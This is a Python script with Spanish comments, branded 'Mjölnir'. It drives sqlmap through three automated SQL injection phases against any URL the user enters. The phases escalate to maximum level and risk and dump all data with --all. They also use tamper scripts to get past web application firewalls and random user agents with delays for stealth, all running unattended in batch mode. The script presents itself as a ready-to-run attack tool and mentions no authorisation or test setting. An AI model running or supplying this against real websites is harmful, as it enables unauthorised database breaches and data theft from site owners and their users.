import subprocess
import sys
import shutil
import os
from typing import Final, List, Iterator
from dataclasses import dataclass, field

# --- Estructura de Datos Centralizada ---

@dataclass(frozen=True)
class AttackPhase:
    """Configuración inmutable de una oleada de asalto."""
    name: str
    level: int
    risk: int
    flags: List[str] = field(default_factory=list)

# --- El Motor de Inversión de Entropía ---

class MjolnirAutomaton:
    """Motor autogestionado: De Agresión Berserker a Cirugía Ghost."""

    def __init__(self, target_url: str):
        # Limpieza absoluta de la URL contra caracteres invisibles (^M)
        self.target: Final[str] = "".join(ch for ch in target_url if ord(ch) >= 32).strip()
        
        # Estrategia Inversa: Menos líneas, más potencia por iteración
        self._strategy: Final[List[AttackPhase]] = [
            AttackPhase("Demolición Berserker", 5, 3, ["--all", "--flush-session"]),
            AttackPhase("Asalto Táctico", 3, 2, ["--threads=10", "--tamper=space2comment"]),
            AttackPhase("Infiltración Ghost", 1, 1, ["--smart", "--random-agent", "--delay=1"])
        ]

    def start_war(self):
        """Ciclo de vida autogestionado del ataque."""
        if not shutil.which("sqlmap"):
            print("[!] Error: SQLMap no detectado. 'sudo apt install sqlmap' es requerido.")
            return

        print(f"\n[+] OBJETIVO FIJADO: {self.target}")

        for phase in self._strategy:
            print(f"\n{'#'*60}\n>>> FASE: {phase.name.upper()} (L:{phase.level}/R:{phase.risk})\n{'#'*60}")
            
            # Comando base universal: Abstracción pura
            cmd = [
                "sqlmap", "-u", self.target,
                "--batch",  # No pregunta nada, toma decisiones solo
                "--level", str(phase.level),
                "--risk", str(phase.risk)
            ] + phase.flags

            try:
                subprocess.run(cmd, check=True)
            except subprocess.CalledProcessError:
                print(f"\n[!] Bloqueo detectado. El WAF ha reaccionado ante {phase.name}.")
            except KeyboardInterrupt:
                print("\n[!] Abortando operación táctica."); break

if __name__ == "__main__":
    # Aseguramos que la terminal esté limpia antes de empezar
    os.system('stty sane')
    
    # FIX: Triples comillas evitan el SyntaxError con la comilla de LOKKY'S
    print("""
    ============================================================
       🔨 LOKKY'S MJÖLNIR - CLEAN BERSERKER v15.0 (FULL AUTO)
    ============================================================
    """)
    
    try:
        url = input("[?] Introduce la URL del objetivo: ").strip()
        if url:
            MjolnirAutomaton(url).start_war()
        else:
            print("[-] Sin URL no hay gloria.")
    except EOFError:
        pass